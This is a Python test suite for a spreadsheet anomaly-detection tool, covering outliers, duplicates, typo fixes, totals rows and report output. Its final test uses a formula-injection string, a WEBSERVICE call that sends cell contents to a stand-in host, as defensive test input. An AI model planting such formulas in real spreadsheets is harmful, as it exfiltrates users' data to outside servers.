import csv

import numpy as np
import pandas as pd
from openpyxl import load_workbook

from anomaly_hunter.cli import run_scan
from anomaly_hunter.limits import read_limits, suggest_limits


def make_clean_csv(path, n=40, seed=0):
    rng = np.random.RandomState(seed)
    df = pd.DataFrame({
        "order": range(1, n + 1),
        "Amount": rng.normal(100, 5, n).round(2),
        "Price": rng.normal(50, 2, n).round(2),
    })
    df.to_csv(path, index=False)
    return df


def write_limits(path, columns_bounds):
    with open(path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["column", "baseline_low", "baseline_high", "weird_low", "weird_high"])
        for col, bounds in columns_bounds.items():
            w.writerow([col, *["" if b is None else b for b in bounds]])


# ---- Hazmat tests: each planted anomaly must be caught, in the right bucket ----

def test_hazmat_weird_limit_breach(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    bad_row = pd.DataFrame([{"order": 999, "Amount": 999999, "Price": 50}])
    pd.concat([df, bad_row]).to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"Amount": (80, 120, 0, 10000), "Price": (None, None, None, None)})

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    rows = list(load_workbook(out_path)["Anomalies"].iter_rows(values_only=True))
    header, body = rows[0], rows[1:]
    amount_idx, sev_idx, bucket_idx = header.index("Amount"), header.index("Severity"), header.index("Bucket")
    flagged = next(r for r in body if r[amount_idx] == 999999)
    assert flagged[sev_idx] in ("Medium", "High")
    assert flagged[bucket_idx] == "Irregularities"


def test_hazmat_duplicate_row(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    pd.concat([df, df.iloc[[0]]]).to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["order", "Amount", "Price"], limits_path)

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    rows = list(load_workbook(out_path)["Anomalies"].iter_rows(values_only=True))
    header, body = rows[0], rows[1:]
    assert any(r[header.index("Bucket")] == "Duplicates" for r in body)


def test_hazmat_text_in_number_column(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    df["Amount"] = df["Amount"].astype(object)
    df.loc[5, "Amount"] = "N/A"
    df.to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"order": (None, None, None, None), "Amount": (None, None, None, None),
                                "Price": (None, None, None, None)})

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    rows = list(load_workbook(out_path)["Anomalies"].iter_rows(values_only=True))
    header, body = rows[0], rows[1:]
    reason_idx, bucket_idx = header.index("Reason"), header.index("Bucket")
    matches = [r for r in body if "N/A" in (r[reason_idx] or "")]
    assert matches
    assert matches[0][bucket_idx] == "Irregularities"


def test_hazmat_spike_in_ordered_series(tmp_path):
    csv_path = tmp_path / "data.csv"
    n = 40
    rng = np.random.RandomState(1)
    df = pd.DataFrame({"order": range(1, n + 1), "Revenue": rng.normal(1000, 20, n).round(2)})
    df.loc[20, "Revenue"] = 5000  # planted spike, single row
    df.to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"order": (None, None, None, None), "Revenue": (None, None, None, None)})

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), "order", str(out_path)) == 0

    rows = list(load_workbook(out_path)["Anomalies"].iter_rows(values_only=True))
    header, body = rows[0], rows[1:]
    flagged_orders = [r[header.index("order")] for r in body]
    assert 21 in flagged_orders  # df index 20 -> order value 21


def test_hazmat_isolation_combo_runs_clean(tmp_path):
    csv_path = tmp_path / "data.csv"
    n = 60
    rng = np.random.RandomState(2)
    a = rng.normal(0, 1, n)
    b = a + rng.normal(0, 0.1, n)
    df = pd.DataFrame({"order": range(1, n + 1), "A": a.round(2), "B": b.round(2)})
    df.loc[30, "A"] = 0.0
    df.loc[30, "B"] = 5.0  # each value alone plausible, combination is not
    df.to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"order": (None, None, None, None), "A": (None, None, None, None),
                                "B": (None, None, None, None)})

    out_path = tmp_path / "report.xlsx"
    # Not asserting this exact row is caught — ML detection on a 60-row sample is
    # inherently noisy. This just proves the isolation/clustering path runs clean.
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0


# ---- Quiet-crowd test ----

def test_quiet_crowd_low_false_positive_rate(tmp_path):
    csv_path = tmp_path / "data.csv"
    rng = np.random.RandomState(42)
    df = pd.DataFrame({
        "Amount": rng.normal(100, 5, 1000).round(2),
        "Price": rng.normal(50, 2, 1000).round(2),
    })
    df.to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["Amount", "Price"], limits_path)

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    flagged = load_workbook(out_path)["Anomalies"].max_row - 1
    assert flagged <= 10  # <=1% of 1000, Noted rows don't count toward this


# ---- Limits tests ----

def test_missing_limits_file_writes_suggestions_and_exits_2(tmp_path):
    csv_path = tmp_path / "data.csv"
    make_clean_csv(csv_path, n=40)
    limits_path = tmp_path / "limits.csv"
    out_path = tmp_path / "report.xlsx"

    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 2
    assert limits_path.exists()
    # "order" is 1..n - a row identifier, not a measurement: no limits for it
    assert set(pd.read_csv(limits_path)["column"]) == {"Amount", "Price"}


def test_suggested_lows_stop_at_zero_for_nonnegative_columns():
    # Real-Excel finding: Units -5 slipped past a suggested low of -53
    from anomaly_hunter.limits import suggest_limits_dict
    df = pd.DataFrame({"Units": [95, 50, 36, 27, 56, 60, 75, 90, 32, 60] * 3 + [-5], "Delta": range(-15, 16)})
    b_lo, _, w_lo, _ = suggest_limits_dict(df, ["Units", "Delta"])["Units"]
    assert b_lo == 0.0 and w_lo == 0.0  # -5 now breaks the weird limit
    assert suggest_limits_dict(df, ["Delta"])["Delta"][0] < 0  # genuinely signed column keeps negative lows


def test_blank_limit_cells_mean_no_limit(tmp_path):
    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"Amount": (None, None, None, None)})
    limits, warnings = read_limits(limits_path, {"Amount": "number"})
    assert limits["Amount"] == (None, None, None, None)
    assert warnings == []


def test_unknown_limits_column_warns_not_crash(tmp_path):
    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"NotAColumn": (0, 1, 0, 1)})
    limits, warnings = read_limits(limits_path, {"Amount": "number"})
    assert limits == {}
    assert len(warnings) == 1


# ---- Report test ----

def test_report_has_three_sheets_and_summary(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["order", "Amount", "Price"], limits_path)
    out_path = tmp_path / "report.xlsx"

    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    wb = load_workbook(out_path)
    assert set(wb.sheetnames) == {"Data", "Anomalies", "Summary"}
    summary_text = "\n".join(str(c.value) for row in wb["Summary"].iter_rows() for c in row if c.value is not None)
    assert "Limits file" in summary_text
    assert "K" in summary_text


# ---- Safety test ----

def test_input_file_untouched(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["order", "Amount", "Price"], limits_path)
    out_path = tmp_path / "report.xlsx"

    before_bytes = csv_path.read_bytes()
    before_mtime = csv_path.stat().st_mtime

    run_scan([str(csv_path)], str(limits_path), None, str(out_path))

    assert csv_path.read_bytes() == before_bytes
    assert csv_path.stat().st_mtime == before_mtime


# ---- Determinism test ----

def test_determinism(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=60, seed=7)
    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["order", "Amount", "Price"], limits_path)

    out1, out2 = tmp_path / "report1.xlsx", tmp_path / "report2.xlsx"
    run_scan([str(csv_path)], str(limits_path), None, str(out1))
    run_scan([str(csv_path)], str(limits_path), None, str(out2))

    rows1 = list(load_workbook(out1)["Anomalies"].iter_rows(values_only=True))
    rows2 = list(load_workbook(out2)["Anomalies"].iter_rows(values_only=True))
    assert rows1 == rows2


def test_identifier_columns_are_not_measurements():
    """SKU/MRN/ZIP/order numbers label rows: no limits, no votes - they used to flag EVERY row."""
    from anomaly_hunter.load import load_from_records
    rng = np.random.RandomState(3)
    n = 60
    cols = ["SKU", "MRN", "ZIP", "Year", "Price", "Units"]
    rows = [[100200 + k, int(rng.randint(1e6, 9e6)), int(rng.choice([2134, 60601])), 2019 + k % 7,
             int(rng.uniform(1e5, 9e5)), int(rng.randint(10, 90))] for k in range(n)]
    _, types, _ = load_from_records(cols, rows)
    assert types == {"SKU": "id", "MRN": "id", "ZIP": "id", "Year": "number", "Price": "number", "Units": "number"}


def test_codes_that_look_like_dates_stay_text():
    from anomaly_hunter.load import load_from_records
    _, types, _ = load_from_records(["Cost Code", "When"], [["03-100", "2026-01-05"], ["03-101", "2026-01-06"], ["04-115", "1/7/2026"]])
    assert types == {"Cost Code": "text", "When": "date"}


def test_totals_rows_are_not_checked_but_a_vendor_called_total_is():
    from anomaly_hunter.load import load_from_records
    from anomaly_hunter.pipeline import summary_rows
    rows = [["2026-01-%02d" % (k + 1), "Total Wine" if k == 3 else "Vendor %d" % k, 100 + k] for k in range(10)]
    rows += [["Total", "", 1045], ["", "", ""], ["", "Grand Total", 2090]]
    rows += [["2026-02-01", "Vendor x", 5], ["2026-02-02", "Vendor y", 6], ["2026-02-03", "Vendor z", 7], ["", "", 18]]  # unlabelled sum
    df, _, _ = load_from_records(["Date", "Vendor", "Amount"], rows)
    assert list(summary_rows(df).nonzero()[0]) == [10, 11, 12, 16]


def test_likely_typo_fixes_and_real_outliers_left_alone():
    from anomaly_hunter.detectors import column_stats, likely_value
    tight = np.array([26.0, 31, 28, 25, 30, 27, 29, 33, 24, 28])
    assert likely_value(2900.0, column_stats(np.append(tight, 2900)), 15, 45) == 29  # x100 (extra zeros)
    assert likely_value(-29.0, column_stats(np.append(tight, -29)), 15, 45) == 29  # sign flip in an all-positive column
    assert likely_value(0.29, column_stats(np.append(tight, 0.29)), 15, 45) == 29  # missing zeros
    pct = np.array([0.12, 0.15, 0.11, 0.14, 0.13, 0.16, 0.12, 0.15])
    assert likely_value(13.0, column_stats(np.append(pct, 13)), 0.05, 0.25) == 0.13  # % typed as 13 for 0.13
    pnl = np.array([520.0, -310, 870, -45, 1200, -760, 300, 95, -1500, 640])
    assert likely_value(-120.0, column_stats(np.append(pnl, -120)), -2000, 2000) is None  # negatives are normal here: no flip
    claims = np.array([900.0, 2500, 15000, 4200, 700, 38000, 1200, 6100, 22000, 3100])
    assert likely_value(90000.0, column_stats(np.append(claims, 90000)), 0, 40000) is None  # whale claim: only 2.4x the next one


def test_category_spelled_differently_is_flagged_with_the_usual_spelling():
    from anomaly_hunter.load import load_from_records
    from anomaly_hunter.pipeline import score
    depts = ["Sales", "Ops", "IT", "Finance"] * 10 + ["sales", "IT ", "IT"]
    df, types, errors = load_from_records(["Dept", "Hours"], [[d, 30 + k % 17 + k / 100] for k, d in enumerate(depts)])
    rows, _ = score(df, types, errors, {}, None)
    assert rows[40]["likely"] == {"Dept": "Sales"} and "looks like" in rows[40]["reason"]
    assert rows[41]["likely"] == {"Dept": "IT"}  # trailing space
    assert not any(r["severity"] for r in rows[:40])  # the usual spellings are fine


def test_value_100x_too_small_is_weird_in_a_positive_column():
    from anomaly_hunter.load import load_from_records
    from anomaly_hunter.limits import suggest_limits_dict
    rng = np.random.RandomState(101)
    df, _, _ = load_from_records(["Sq Ft"], [[int(rng.uniform(900, 3500))] for _ in range(70)] + [[22]])
    assert suggest_limits_dict(df, ["Sq Ft"])["Sq Ft"][2] > 22  # weird low no longer rounds down to 0


def test_two_slips_at_once_is_not_an_obvious_typo():
    from anomaly_hunter.detectors import column_stats, likely_value
    units = np.array([40.0, 52, 61, 47, 55, 58, 44, 50, 66, 49])
    assert likely_value(-5.0, column_stats(np.append(units, -5)), 25, 80) is None  # -5 -> 50 would be sign AND zeros: just guessing


def test_review_fixes_ids_totals_names():
    from anomaly_hunter.load import load_from_records
    from anomaly_hunter.limits import suggest_limits_dict
    from anomaly_hunter.pipeline import score, summary_rows
    # a text ID among numeric IDs is a value, not a blank
    df, types, errors = load_from_records(["SKU", "Qty"], [[100200 + k, 10 + k % 7 + k / 100] for k in range(40)] + [["A-17", 12.5]])
    rows, _ = score(df, types, errors, {}, None)
    assert types["SKU"] == "id" and not rows[-1]["severity"]
    # 0/1 count columns: no fake "sum rows"
    df, _, _ = load_from_records(["Late", "Damaged"], [[a, b] for _ in range(10) for a, b in ((1, 0), (0, 1), (1, 1), (0, 0))])
    assert not summary_rows(df).any()
    # "Average" as a category in an otherwise full row (one blank) is data
    df, _, _ = load_from_records(["Rating", "Score", "Note"], [["Good", 5 + k % 3, "x"] for k in range(9)] + [["Average", 4, ""]])
    assert not summary_rows(df).any()
    # whole-word ID names only
    _, types, _ = load_from_records(["Mean", "Zip Code", "Clean"], [[k % 9, 60601 + k % 3, k % 4] for k in range(30)])
    assert types == {"Mean": "number", "Zip Code": "id", "Clean": "number"}
    # baseline low never tighter than weird low
    rng = np.random.RandomState(5)
    df, _, _ = load_from_records(["Paid"], [[round(float(rng.lognormal(8, 1)), 2)] for _ in range(80)])
    b_lo, _, w_lo, _ = suggest_limits_dict(df, ["Paid"])["Paid"]
    assert b_lo >= w_lo


def test_formula_like_text_is_never_offered_as_a_spelling_fix():
    from anomaly_hunter.load import load_from_records
    from anomaly_hunter.pipeline import score
    vals = ['=WEBSERVICE("https://x/?"&A1)'] * 4 + ['=webservice("https://x/?"&a1)'] + ["Ok"] * 30
    df, types, errors = load_from_records(["Note", "N"], [[v, k] for k, v in enumerate(vals)])
    rows, _ = score(df, types, errors, {}, None)
    assert not any(r.get("likely") for r in rows)
